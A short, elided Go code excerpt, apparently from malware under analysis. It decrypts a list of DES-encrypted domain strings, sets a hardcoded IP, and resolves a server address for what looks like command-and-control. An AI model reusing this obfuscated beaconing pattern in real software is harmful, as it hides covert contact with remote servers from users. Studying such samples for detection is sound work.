...
func ini() {
	lockdown = false
	//9Tjg6W0RdzuMXyuKAeM//g==
	tmpu01 = godes("9Tjg6W0RdzuMXyuKAeM//g==", false)
	tmpip01 = "10.93.32.89"
	...
	domainlistdes = append(domainlistdes, "9Tjg6W0RdzuMXyuKAeM//g==")
	domainlistdes = append(domainlistdes, "qJeg4bluvh49xY9vDyDQ+Q==")
	domainlistdes = append(domainlistdes, "aCPcx8gbGaRZ793guCxX4g==")
	domainlistdes = append(domainlistdes, "lDdrVQ0XcQCgQ4E+UQn1b6R1ScMmWjrlGjR1KbGBwLA=") //d9
	domainlistdes = append(domainlistdes, "eaQ09adqNEegdCtCP/Hvvw==")                     //youtu.be
	//127. 7GE8XjltN0ZX0XA4O6nTYQ==
	//seraddress = findaddressbydomain(godes("8HBDsp7EShWptDdSEIdFMQ==", false))
	seraddress = findaddressbydomain(readsvraddr())
...
func findaddressbydomain(domain string) string {
	...
	if err != nil {
		...
		wlog("Resolution error " + err.Error())
		//os.Exit(1)
	}
	re = addr.String()
